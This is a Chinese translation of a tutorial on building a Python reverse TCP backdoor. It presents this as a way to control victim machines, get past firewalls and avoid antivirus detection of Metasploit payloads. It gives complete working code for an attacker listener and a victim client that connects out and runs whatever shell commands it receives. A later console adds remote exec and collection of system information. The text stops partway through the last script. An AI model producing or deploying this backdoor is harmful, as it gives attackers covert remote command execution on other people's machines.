> 原文链接: https://www.anquanke.com//post/id/92401 


# 如何基于Python写一个TCP反向连接后门


                                阅读量   
                                **161931**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者sergeantsploit，文章来源：0x00sec.org
                                <br>原文地址：[https://0x00sec.org/t/how-to-make-a-reverse-tcp-backdoor-in-pytho](https://0x00sec.org/t/how-to-make-a-reverse-tcp-backdoor-in-pytho)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t01362485dfbf75edc6.jpg)](https://p0.ssl.qhimg.com/t01362485dfbf75edc6.jpg)



## 0x0 介绍

在Linux系统做未授权测试,我们须准备一个安全的渗透环境，通常第一件事就是安装虚拟机。且在攻击阶段中还需要对受害系统进行控制。常见的后门大多数是利用Metasploit生成，而目前反病毒产品遇到Metasploit文件签名的程序就会添加特征库作为查杀对象，所以开发出自己的后门程序非常必要。

这篇文章将介绍如何写一个具有反向连接功能的后门。

**反向连接**：通常的网络连接程序是由客户端通过服务器开放的端口连接到服务器，反向连接是客户端打开服务器端口，由服务器主动连接客户端。反向连接这种方式常用于绕过防火墙和路由器安全限制。

举个例子，防火墙隔离的计算机会阻止传入的连接，但对于连接Internet服务器的出站连接则不做严格限制。一旦连接建立网络通讯，远程主机就可以向后门发送命令。这种通讯方法更有助于控制受控机器，也更不容易检测。

在本系列教程文章中，将分成3部分撰写，一步步介绍如何用Python语言开发一个反向TCP连接程序。每一个部分都会介绍一个新函数、命令或代码，使其更加灵活。



## 0x1 第一部分：创建反向连接基础

这一部分将介绍创建网络连接，发送和接受输出。

### <a class="reference-link" name="1.1%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E7%BC%96%E5%86%99(%E6%8E%A7%E5%88%B6%E7%AB%AF)"></a>1.1 服务器端编写(控制端)

前面介绍过，攻击者并不会主动连接受控服务器，因为会被受控制服务器的防火墙拦截。<br>
但是我们可以把自身当成服务器，让受控服务器作为客户端反向连接我们，然后向客户端发送命令。客户端与服务端安装套接字实现反向连接的代码如下：

[![](https://p4.ssl.qhimg.com/t0111a35e41304e6bb9.png)](https://p4.ssl.qhimg.com/t0111a35e41304e6bb9.png)

让我们分解以上代码，逐行解释每段代码的作用：
- 整体思路：声明subprocess模块中的sp函数执行命令
- 1）监听信息：通过获取命令行参数得到套接字监听的主机IP、端口
- 2）套接字部分：安装套接字，绑定套接字，监听连接、接收客户端的连接
- 3）输出连接信息：如果有网络连接信息，就打印出来
- 4）循环部分：将脚本运行到一个while循环中，以便发送命令并接收输出5）if判断-1： 如果输入的命令不是”exit()”程序继续运行，否则发送给客户端”exit()”,让客户端关闭套接字连接
- 6）if判断-2：如果输入的命令是空的，我们再次跳过while循环。不执行后面的命令
- 7）发送、接收命令：如果if判断没有执行退出或者跳过，则负责发送和接收命令
- 8）处理接收结果：将接收的数据和数据实际大小切割开来存放
- 9）处理数据：如果接收的数据实际大小跟接收数据的大小不匹配，那就运行一个while循环把剩余的数据拼接起来，直到数据实际大小跟接收数据结果相等
- 10）打印结果过滤换行符
- 11）出现异常则关闭套接字
以上代码理解起来并不困难，但是随着代码的复杂度不会再逐行解释，只解释重要的部分。接下来让我们编写客户端的Socket部分。

### <a class="reference-link" name="1.2%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99(%E5%8F%97%E6%8E%A7%E5%88%B6%E7%AB%AF)"></a>1.2 客户端代码编写(受控制端)

受害者连接我们的代码不应该太多。

[![](https://p5.ssl.qhimg.com/t0190eea59f36b76f56.png)](https://p5.ssl.qhimg.com/t0190eea59f36b76f56.png)

让我们分解以上代码，逐行解释每段代码的作用：
- 1）通过sys.argv模块的命令行接受Socket套接字信息
- 2）设置Socket套接字并连接到指定的主机IP、端口。
- 3）接收服务器发送的命令的部分放在一个循环语句内。
- 4）如果接收的命令不是exit()，就通过管道执行接收的命令。执行命令后的输出分配给变量sh。
- 5）（out,err）是标准的stdout和stderr流。
- 6）将流的输出分配给result变量。
- 7）将文件大小设置为16字节的long型，用于助服务器端（攻击者）识别文件大小。
- 8）计算长度并将其附加到输出里。
if-else后的部分：如果收到的命令是exit()，跳出循环和关闭连接。

执行我们的攻击者（服务器）脚本，看看结果如下：

```
root@Sploit:~/Desktop# python reverseTcp.py '' 8000
```

客户端连接命令行的主机信息。

```
root@Sploit:~/Desktop# python connect.py 127.0.0.1 8000
```

服务器脚本运行的截图：

[![](https://p3.ssl.qhimg.com/t017a7c2d5f1c979741.png)](https://p3.ssl.qhimg.com/t017a7c2d5f1c979741.png)

正如预期，客户机控制台是空的，因为我们没有打印任何东西。预期编写完成后的截图如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01b313d15ed3c92d13.png)

到此我们已经将基础的反向TCP连接代码编写完成了，现在将继续编写些基础函数来帮助我们把程序界面改善，例如给Shell界面添加颜色。<br>
这份代码在Windows上也可以运行，但Windows平台不是本系列教程的首选平台。

## 1.3 实践部分

**reverseTcp.py**

```
# -*- coding: utf-8 -*-
import socket,subprocess as sp,sys                    # 导入subprocess，socket模块

# 1）监听信息
host = sys.argv[1]                                   # 攻击者地址，通常留空''
port = int(sys.argv[2])                              # 攻击者主机端口

# 2）套接字部分
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # 安装套接字
s.bind((host,port))                                  # 绑定套接字
s.listen(100)                                        # 最大连接数:100
conn,addr  = s.accept()                              # 接收客户端连接

# 3）输出连接信息
print "[+] Conection Established from: %s" % (str(addr[0]))
                                                     # 打印攻击者的连接信息
# 4）接收输出
while 1:                                            # 运行死循环初始化反向的连接
    command = raw_input("#&gt; ")                      # 服务器输入
    # 5）if判断-1
    if command != "exit()":                         # 如果命令不是exit()，那就继续执行
        # 6）if判断-2
        if command == "": continue                  # 命令如果为空，循环这个函数
        # 7）发送、接收命令
        conn.send(command)                          # 发送命令到客户端
        result = conn.recv(1024)                    # 接收并输出
        # 8） 处理接收结果
        total_size = long(result[:16])              # 获取返回数据的大小,取出前16位的值
        result = result[16:]                        # 接收数据的结果，取16位之后的值
        # 9） 处理数据
        while total_size &gt; len(result):             # 循环函数
            data = conn.recv(1024)                  # 每次接收1024的数据，如果发送的数据大于现在接收的数据
            result += data                          # 循环接收并且拼接起来
        # 10）打印结果过滤换行符
        print result.rstrip("n")                   # 过滤掉换行符
    else:
        conn.send("exit()")                         # 发送客户端关闭的消息
        print "[+] shell Going Down"                # 本地退出提示
        break
# 11）出现任何故障关闭套接字
s.close()                                           # 关闭网络套接字
```

**connect.py**

```
#!/usr/bin/python
#coding:utf-8

import socket,subprocess as sp,sys                    # 导入subprocess，socket模块

# 1）连接信息
host = sys.argv[1]                                   # 攻击者地址，通常留空''
port = int(sys.argv[2])                              # 攻击者主机端口

# 2）套接字部分
conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # 安装套接字
conn.connect((host,port))

while 1:
    command = str(conn.recv(1024))

    if command != "exit()":
        sh = sp.Popen(command,shell=True,
                      stdout=sp.PIPE,
                      stderr=sp.PIPE,
                      stdin=sp.PIPE)

        out,err = sh.communicate()   # 与进程交互：将数据发送到标准输入。从标准输出和标准错误读取数据，直至到达文件末尾。

        result = str(out) + str(err)

        length = str(len(result)).zfill(16)

        conn.send(length + result)
    else:
        break


conn.close()
```



## 0x2 第二部分：美化Shell界面

在第二部分教程中，我们会把服务器端脚本的Shell界面进行美化。

### <a class="reference-link" name="2.1%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BB%A3%E7%A0%81"></a>2.1 服务端代码

#### <a class="reference-link" name="Import-%E5%AF%BC%E5%85%A5%E6%A8%A1%E5%9D%97%E5%A3%B0%E6%98%8E"></a>Import-导入模块声明

我们导入模块声明的语句如下：

```
#!/usr/bin/env python
import socket, sys, os
```

#### <a class="reference-link" name="Colors()%E5%87%BD%E6%95%B0"></a>Colors()函数

这个函数将把我们的Shell中的文本替换得更加美观。

[![](https://p4.ssl.qhimg.com/t0178d5293e1bb115bf.png)](https://p4.ssl.qhimg.com/t0178d5293e1bb115bf.png)

这个函数用指定的颜色来修饰传递给它的任何文本。接受的字符和显示颜色说明如下：

```
"r" or "red" - Red
"g" or "green" - Green
"b" or "blue" - Blue
"y" or "yellow" - Yellow
"lgray" - Light Gray
"underline" - Underline Text
"strike" - Strikes Text
```

#### <a class="reference-link" name="Banner()%E5%87%BD%E6%95%B0"></a>Banner()函数

这些介绍的基础函数不是必需要写的代码，但是改善了用户使用的体验感，具体的美化效果可以自己定制。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015d63cff6b977a8a5.png)

编辑：我把“lgray”改成了“gray”。 我们可以根据个人喜好更改。

这个函数的具体作用是将程序说明文本的内容返回给调用者。

#### <a class="reference-link" name="Main_control()%E5%87%BD%E6%95%B0"></a>Main_control()函数

Main_control()函数的作用是接收服务器Socket套接字。在前面的文章中我们没有使用调用函数的方式编写代码，而是采用了过程化的代码。现在这些过程化代码被封装到Main_control()函数中，方便后续的修改。代码如下图所示：

[![](https://p5.ssl.qhimg.com/t01e54489c48d3dd632.png)](https://p5.ssl.qhimg.com/t01e54489c48d3dd632.png)

看到这一坨代码请不要惊慌，我们只需要关注代码带来的脑力挑战即可。让我们分解一下代码开始解读吧？：
- 1）我们接受Socket套接字信息后将其传递给相应的变量host、port变量
<li>2）如果异常没有捕获到任何错误，则借助script_color()函数打印出”Framework Started<br>
Successfully”</li>
- 3）调用banner()函数，打印函数里的文本到界面上
- 4）设置Socket套接字，绑定和监听
- 5）开头已经将主机作为空字符串参数传递。所以我们在设置套接字后，如果参数为空就将主机字符串默认设为“localhost”
- 6）打印出”Listening on host address:port number …”
- 7）等待接收Socket套接字信息连接，捕获到错误输入则打印错误中断提示
- 8）如果客户端顺利连接，就会将Socket套接字数据和主机地址作为参数传递进入console()控制台函数
- 9）当console()函数执行完毕后，关闭创建的Socket套接字
#### <a class="reference-link" name="Console()%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%87%BD%E6%95%B0"></a>Console()控制台函数

这部分代码很容易令人灰心！只有坚持看下去才能渡过难关。console()控制台函数的代码如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t016ab7d25d25f06fff.png)

以上的代码非常长，首先我们打印一个字符串表示从远程主机建立连接。然后我们从数据流中接收数据。数据流中包含有关于远程系统的信息（我们会在Client(客户端)执行）。以下是数据显示的布局内容：

```
系统类型

计算机名称（节点名称）

发行版本

系统版本

机器架构

用户名
```

所有信息都是来自OS模块的uname()和getlogin()函数（我们在Client(客户端)执行的代码）。

使用收到的信息为Shell创建自定义提示名称，例如：[root@127.0.0](mailto:root@127.0.0).1。

然后我们进入while循环，该循环包含连接的命令。由于我们重新自定义了程序命令，因此原装操作系统命令类似于“ls -l”和其他linux命令将无法正常使用。

下面是我们的前5条内置命令。
1. exec——接收一个命令作为参数，并在远程主机上执行该命令。这是我们调用Linux命令的地方，例如：exec ls -l
1. cls – 清除终端显示的信息，使用默认的linux clear命令
1. help – 调用help函数打印帮助文本
1. sysinfo – 打印出收到的远程系统信息
1. exit() – 向远程shell发送一个停止命令，在本地退出控制界面。
1. 任何非指定的命令都不会被接受，并且会在else语句中打印一条错误消息。
在内置的exec命令中，不会有任何的参数被传递并且会输出一个错误消息。我们在exec命令中有一个新的函数send_data。它接受连接流和要执行的命令。负责自动处理数据的发送和接收。

这段代码读者最好可以自己动手写一遍，这样就可以在代码运行后进行修改。如果在写作过程中进行修改的话，可能会导致很多问题。

#### <a class="reference-link" name="help()%E5%B8%AE%E5%8A%A9%E5%87%BD%E6%95%B0"></a>help()帮助函数

所有内置在这个框架(脚本)中的命令都将在这里说明。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01df937f54ea09e0b4.png)

这个函数会按照顺序打印一个help_list字典，并对字符进行美化处理后循环输出来。

#### <a class="reference-link" name="Send_data()%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE%E7%9A%84%E5%87%BD%E6%95%B0"></a>Send_data()发送数据的函数

该函数计算数据的长度后将其与数据一起发送。

[![](https://p1.ssl.qhimg.com/t013ddc896cf2e60135.png)](https://p1.ssl.qhimg.com/t013ddc896cf2e60135.png)

现在我们把调用函数组合放在一起。

我们必须调用函数，否则它自己是不会执行的。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01b5480456129bf304.png)

至此我们完成了部分代码，现在让我们将客户机脚本也进行相应的修改。

### <a class="reference-link" name="2.2%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%A3%E7%A0%81"></a>2.2 客户端代码

客户端也需要遵守一些规则和命令，比如服务器脚本中的exec命令。我们的import声明应该改成:

```
#!/usr/bin/env python
import socket, subprocess as sp, sys, os
```

我们首先建立的函数是connect()连接函数。

#### <a class="reference-link" name="Connect()%E5%87%BD%E6%95%B0"></a>Connect()函数

该函数跟名称含义一样，作用为跟指定的地址连接建立后发送自身系统信息，接收控制端的远程命令。

[![](https://p0.ssl.qhimg.com/t012176f65c322266b9.png)](https://p0.ssl.qhimg.com/t012176f65c322266b9.png)

然后以连接流作为参数调用interactive_session()交互式会话函数。

#### <a class="reference-link" name="interactive_session()%E4%BA%A4%E4%BA%92%E5%BC%8F%E4%BC%9A%E8%AF%9D%E5%87%BD%E6%95%B0"></a>interactive_session()交互式会话函数

该函数运行一个循环根据“if”语句接受和执行命令。

[![](https://p5.ssl.qhimg.com/t011d5a2b9e97bb0194.png)](https://p5.ssl.qhimg.com/t011d5a2b9e97bb0194.png)

该函数使用另一个send_data()发送数据函数来发送数据。

#### <a class="reference-link" name="Send_data()%E6%95%B0%E6%8D%AE%E5%8F%91%E9%80%81%E5%87%BD%E6%95%B0"></a>Send_data()数据发送函数

该函数将计算数据执行后结果的总长度，将执行后的结果转换为字符串，填充为16位。将这个总长度跟执行后的结果数据一起发送出去。

[![](https://p1.ssl.qhimg.com/t01781bcb9bd4035fd8.png)](https://p1.ssl.qhimg.com/t01781bcb9bd4035fd8.png)

为了便于将来的修改和添加功能，我们把所有的函数代码组合在一起,放到connect()函数里。

当然，在主函数里我们必须调用connect()函数，否则函数自己是不会自动执行的。

[![](https://p3.ssl.qhimg.com/t01eb18968f09abd4ca.png)](https://p3.ssl.qhimg.com/t01eb18968f09abd4ca.png)

让我们执行服务器控制端的脚本，监听一个8000端口，看看得到了什么结果。

```
root@Sploit:~/Desktop# python reverseTcp.py '' 8000
```

执行受控制客户端在命令行上连接控制端主机，输出命令的方式如下。

```
root@Sploit:~/Desktop# python connect.py 127.0.0.1 8000
```

以下是攻击者服务器脚本的运行截图：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01534b85a6edab2c2c.png)

帮助选项如下：

[![](https://p5.ssl.qhimg.com/t0116e2ee18670d01a9.png)](https://p5.ssl.qhimg.com/t0116e2ee18670d01a9.png)

通过NMap扫描远程系统得到的结果，受控制客户端已经打开了服务端口，正如预期的那样，客户端控制台显示出来的信息应该是空的，因为我们没有打印任何东西到终端界面上。

### <a class="reference-link" name="2.3%20%E5%AE%9E%E8%B7%B5%E9%83%A8%E5%88%86"></a>2.3 实践部分

**reverse_tcp_part2.py**

```
# -*- coding: utf-8 -*-
import socket,subprocess as sp
import sys
import os
import platform

# 颜色美化函数
def script_colors(color_type,text):
    color_end = '33[0m'

    if color_type.lower() == "r" or color_type.lower() == "red":
        red = '33[91m'
        text = red + text + color_end
    elif color_type.lower() == "lgray":
        gray = '33[2m'
        text = gray + text + color_end
    elif color_type.lower() == "gray":
        gray = '33[90m'
        text = gray + text + color_end
    elif color_type.lower() == "strike":
        strike = '33[9m'
        text = strike + text + color_end
    elif color_type.lower() == "underline":
        underline = '33[4m'
        text = underline + text + color_end
    elif color_type.lower() == "b" or color_type.lower() == "blue":
        blue = '33[94m'
        text = blue + text + color_end
    elif color_type.lower() == "g" or color_type.lower() == "gree":
        gree = '33[92m'
        text = gree + text + color_end
    elif color_type.lower() == "y" or color_type.lower() == "yellow":
        yellow = '33[93m'
        text = yellow + text + color_end
    else:
        return text
    return text

# 横幅函数
def banner():
    banner = '''
sszhhzDDhzszhzzhhzssss====ss=+===+====ss=szzzzzzzDDDDhDhzzsD
s+zhhzhhzzsshhzhzhhsss====ss==sss====szszzhhhzzzzhzDDDDDzssD
=+zzhhhhzzhzhhhhzzzssssszsszz=szss====ssszhhhhhhzszDhDDhz==h
=+zzhhhzzhhhzzhhzssss+szsssss=sss=s+=s=sszzzhhhDhzhhhhhhs+=h
z+shzzzzzhzhhhzhsssss+=sszs=s=sssss=====szszhhzzhhsshhhhs(=h
s&lt;=hhzzzhsszhhzsshhzs=+szzsss===ssss==+=szzszzzzzzhzhDhh=&lt;hh
=&lt;=hhzzzzszzss=szhhszs=+shssss==ssss=+&lt;szzzszzhzszzzhDDh+=hh
+=shDshzzssz=sszzs=szz=+=zs=+s==s======zzzzzhzzhzsszshBh=&lt;sh
&lt;==szsszzsssszsss+++zz=++sz==s=====+=+=zssshzzzzszszszDh=&lt;+h
(((&lt;=s=sssssssss=+===s=&lt;+=ssssss=s==++=ss+==ss=sszsss=+++&lt;&lt;z
((&lt;+=sssssss=++=+&lt;+++s+&lt;====ssszs=s=+&lt;=s==+++=sszz====&lt;((((+
&lt;&lt;&lt;+++=s=s===+++++++ss+++====sss====++zs=&lt;++++=sss====+((&lt;((
+((&lt;&lt;=s=+==s=s=+=(&lt;=sh++==s==ss=====++sz=++==+&lt;=ss=+&lt;&lt;&lt;((((&lt;
&lt;((&lt;+++=====++++++++szs=+=s=s=s=====+=zs++++=+&lt;&lt;=====&lt;&lt;((((&lt;
(&lt;+&lt;&lt;+=+=s=+&lt;=szszs=sss=======s======sz=+=+=s+&lt;&lt;&lt;==+++&lt;((~~(
&lt;++&lt;&lt;+++=ssszDDhDBBDzsssss====+=+==ssss=zDDDDhs&lt;&lt;==+&lt;&lt;((((~(
++&lt;&lt;&lt;&lt;&lt;+=szshhsshz=hDs==ss==+=&lt;&lt;+=ss=+=hBDsshBD=&lt;+++&lt;(~((&lt;((
=&lt;++&lt;+++=zs+hs+zDs--hh=+===+=+&lt;&lt;+=s=++hDh&lt;.-=sh=+++&lt;&lt;(((~(&lt;(
+&lt;=+=====+&lt;&lt;z=&lt;hDhz=sDs&lt;&lt;+=++&lt;(&lt;++=&lt;(zszh=~s+&lt;s+&lt;===&lt;&lt;((((((
++=+++&lt;&lt;(&lt;(&lt;z=&lt;hBBNh=hD+&lt;+=&lt;&lt;&lt;(&lt;&lt;+&lt;(+z+sDDDD&lt;&lt;z=~(+=+&lt;(&lt;(~((
+===+&lt;&lt;&lt;&lt;&lt;&lt;&lt;ss&lt;=hBD++hB&lt;(&lt;&lt;&lt;&lt;&lt;((&lt;&lt;~-sh&lt;=BNNz&lt;&lt;z+~(&lt;&lt;&lt;((&lt;((((
==ss=++=+&lt;&lt;&lt;=z+(+=+&lt;=BB&lt;(&lt;&lt;&lt;&lt;&lt;(&lt;(&lt;~-zB&lt;(=Dh+(sz(~~&lt;&lt;&lt;((+&lt;(((
==ss=====+++&lt;=z=+&lt;+sDBB&lt;~&lt;&lt;(&lt;&lt;((((-~zNz((+&lt;(=h+~((&lt;&lt;&lt;&lt;(&lt;&lt;(&lt;&lt;
==========+&lt;+&lt;+szhhDDDD&lt;-(&lt;((((~~~~~zDDh=+=zh=((&lt;+++&lt;&lt;(&lt;&lt;&lt;&lt;&lt;
===s========+&lt;&lt;&lt;++++&lt;+D+~(&lt;(((((~~~(s+=shzzs&lt;(+=++++&lt;((&lt;(&lt;&lt;&lt;
=====s=======++((~~~-+h=(&lt;&lt;&lt;+&lt;((((-(s&lt;--(&lt;&lt;((&lt;====+&lt;&lt;((&lt;&lt;&lt;(+
==+===ss======+=&lt;~((&lt;+==((&lt;&lt;(~~(((-&lt;=+~--~(&lt;+++++=+&lt;&lt;(((&lt;+&lt;+
s=====ssss=+++==++++=&lt;++(&lt;+~~---((~++(((((&lt;++++&lt;+++&lt;&lt;((((&lt;&lt;=
ss===sss=s==s=+=+++++&lt;&lt;+(&lt;(~~~~-~(~&lt;&lt;~(&lt;&lt;&lt;&lt;=&lt;&lt;=+++&lt;&lt;&lt;&lt;((&lt;&lt;&lt;=
sss==sszssss=s=+++++&lt;((&lt;=&lt;(~~~~--~&lt;=&lt;~~(&lt;&lt;&lt;+&lt;&lt;+++&lt;&lt;+&lt;&lt;&lt;(+&lt;&lt;s
sssssszzszss=====+++&lt;((=s&lt;(~~~~~~~+=(~(~(+&lt;&lt;++++++==++&lt;&lt;=&lt;=s
ssssszhhzzzssss==++&lt;&lt;((+s+&lt;(~~~~~(=+--~~~&lt;&lt;&lt;++++===s++&lt;+++zs
zssssszzzzzhzsss=++&lt;&lt;~(&lt;+=&lt;&lt;((~(((=(-'~(((&lt;+++=szs=s=++++=zz
hsszzssszzzhzss=s++&lt;((((+===&lt;((&lt;+&lt;+~'--~(&lt;&lt;&lt;=sszsss====+=szz
hzsszzzsszzzhsszz=&lt;&lt;&lt;&lt;&lt;&lt;=szz=+==ss=&lt;-~~(~(+=+=sss==s===+szzz
hhzsszzzzzzzzzzhzss=&lt;+++shDhhzzhhhh(~(((&lt;+=+=ssssszss===szzs
zhzssszzzzzzzhz=+=s+==+&lt;&lt;zDDDDhDDz&lt;'~(&lt;&lt;+&lt;((=ssszzzs===zzzss
hhhhzzzzzzzzzhz=ss=s++&lt;&lt;(&lt;zBDDDDh&lt;'~~(~(&lt;&lt;++====+===++szzsss
hhhhzzzzzzzzzzzssszzss==+&lt;+hDDDD+~~(&lt;+&lt;+=+++szzzzzs==szzssss
zhhhhhhzzzzzzzzzss=======+++hBB=(&lt;&lt;&lt;(&lt;&lt;++==szssszs=+=zhzzsss
zhhhDhhzzzsszzzhzsszzss+===+sDh+==+&lt;&lt;++===ssssssss=szhhzzzzs
hhhhhhhhzzzzhhhhhzsssss=ssssshzs=++=+=+==sssssss=sszhzzzzzzs
zzhhhhhhDDhhhhhhhzzzssssszsszhhz=======ssssszsss=shhhzzzsszs
zzzhzhhDDDDDhhhhhhhzzzzhhhzhhhhhzzzhzssszzzzzzszhzhhzzzzzzzs
zzzzhhhhDhDDDhhhDhhhhzzhhhhzzhzzhhhhzszzhzzszhhhhhhzzzzsszzs
zzzhhhhhDDDDDDDDDDDhhhzs=zzzzzzzss=szzhhhhhhhDDhhzzzzzzzzsss
zzzhhhhhDhhhDDDDDDDDDDhzzs=szss==szzhhDDDDDDDDhhhhzzzzzzzzsz
zzhhhhhhhhhhDDDDDDDDDDDDDzs=ss==szDDDDDDDDDDDhhDDhhzzzzzzzsz
zzhhzhhhhhhDDDDDDDDDDDDDDDhhhhzhDDDhDDDDDDhhhhhhhhhzzzzzzzsz
zzzzzhhhhhhhDDDDDDDDDDDDDDDDDDDDDDhDDDhhhhhhhzhzzzhzzzzzzzzs

             --=[ Version 1.0 Alpha Scarlet ]=--
             --=[ I am ready ... Lets pwn   ]=--

'''
    return script_colors('gray',banner)

# 控制台函数
def console(connection, address):
    print script_colors("g", " [ Info ] ") + script_colors("b", "Connection Established from %sn" % (address))

    sysinfo = connection.recv(2048).split(",")

    x_info = ''
    x_info += script_colors("g","Operating System: ") +"%sn" % (script_colors("b",sysinfo[0]))
    x_info += script_colors("g","Computer Name: ") +"%sn" % (script_colors("b",sysinfo[1]))
    x_info += script_colors("g","Username: ") + "%sn" % (script_colors("b",sysinfo[5]))
    x_info += script_colors("g","Release Version: ") + "%sn" % (script_colors("b",sysinfo[2]))
    x_info += script_colors("g","System Version: ") + "%sn" % (script_colors("b",sysinfo[3]))
    x_info += script_colors("g","Machine Architecture: ") + "%s" % (script_colors("b",sysinfo[4]))

    if sysinfo[0] == "Linux":
        user = sysinfo[6] + "@" + address
    elif sysinfo[0] == "Windows":
        user = sysinfo[7] + "@" + address
    else:
        user = "Unknown@" + address

    while 1:
        command = raw_input(" " + script_colors("underline",
                                                script_colors("lgray","%s" % (user))) + " " + script_colors('lgray',"&gt;") + " ").strip()
        if command.split(" ")[0] == "exec":
            if len(command.split(" ")) == 1:
                print script_colors("r", "n [!] ") + script_colors("b", "Command: exec &lt;command&gt;")
                print script_colors("g", "n Execute Argument As Command On Remote Hostn")
                continue

            res = 1
            msg = " "

            while len(command.split(" ")) &gt; res:
                msg += command.split(" ")[res] + " "
                res += 1

            response = send_data(connection,"exec " + msg)

            if response.split("n")[-1].strip() != "":
                response += "n"
            if response.split("n")[0].strip()!="":
                response = "n" + response

            for x in response.split("n"):
                print " " + x
        elif command == "":
            continue
        elif command == "cls":
            if sysinfo[0] == "Linux":
                dp = os.system("clear")
            elif sysinfo[0] == "Windows":
                dp = os.system("cls")
        elif command == "help":
            print script_colors("lgray",help())
        elif command == "sysinfo":
            if sysinfo[0] == "Linux":
                print script_colors("g", "Operating System: ") + "%s" % (script_colors("b", sysinfo[0]))
                print script_colors("g", "Computer Name: ") + "%s" % (script_colors("b", sysinfo[1]))
                print script_colors("g", "Username: ") + "%s" % (script_colors("b", sysinfo[6]))
                print script_colors("g", "Release Version: ") + "%s" % (script_colors("b", sysinfo[2]))
                print script_colors("g", "System Version: ") + "%s" % (script_colors("b", sysinfo[3]))
                print script_colors("g", "Machine Architecture: ") + "%s" % (script_colors("b", sysinfo[4]))
            elif sysinfo[0] == "Windows":
                print script_colors("g", "Operating System: ") + "%s" % (script_colors("b", sysinfo[0]))
                print script_colors("g", "Computer Name: ") + "%s" % (script_colors("b", sysinfo[1]))
                print script_colors("g", "Username: ") + "%s" % (script_colors("b", sysinfo[7]))
                print script_colors("g", "Release Version: ") + "%s" % (script_colors("b", sysinfo[2]))
                print script_colors("g", "System Version: ") + "%s" % (script_colors("b", sysinfo[3]))
                print script_colors("g", "Machine Architecture: ") + "%s" % (script_colors("b", sysinfo[4]))

        elif command == "exit()":
            connection.send("exit()")
            print script_colors("b"," [+] ") + script_colors("g","Shell Going Down")
            break
        else:
            print script_colors("red","[!] Unknown Command")

# 帮助函数
def help():
    help_list = `{``}`
    help_list["sysinfo"] = "Display Remote System Information"
    help_list["exec"] = "Execute Argument Ad Command On Remete Host"
    help_list["cls"] = "Clears The Terminal"
    help_list["help"] = "Prints this help message"

    return_str = script_colors("g", "n Command ") + " . "
    return_str += script_colors("b", " Descriptionn %sn" % (script_colors("gray", "-" * 50)))


    for x in sorted(help_list):
        dec = help_list[x]
        return_str += " " + script_colors("g", x) + " - " + script_colors("b", dec + "n")

    return return_str.rstrip("n")

# 发送数据
def send_data(connection,data):
    try:
        connection.send(data)
    except socket.error as e:
        print script_colors("red","[ - ]") + "Unable To Send Data"
        return

    result = connection.recv(2048)
    total_size = long(result[:16])
    result = result[16:]

    while total_size &gt; len(result):
        data = connection.recv(2048)
        result += data

    return  result.rstrip("n")

# 主控制函数
def main_control():
    try:
        #host = sys.argv[1]      # 攻击者主机地址
        #port = int(sys.argv[2]) # 攻击者主机端口

        host = "192.168.14.45"
        port = 3800


    except Exception as e:
        print script_colors("red","[-]") + "Socket Information Not Provided"
        sys.exit(1)

    print script_colors("g"," [+]") + script_colors("b"," Framework Standard Successfully")
    print banner()

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # 安装套接字
    s.bind((host,port))
    s.listen(5)

    if host == "":
        host = "localhost"

    print script_colors("g", " [info] ") + script_colors("b", "Listening on %s%d ..." % (host, port))

    try:
        conn,addr = s.accept()
    except KeyboardInterrupt:
        print "nn " + script_colors("red", "[-]") + script_colors("b", " User Request An Interrupt")
        sys.exit(0)

    console(conn,str(addr[0]))

    s.close() # 关闭套接字

if __name__ == "__main__":
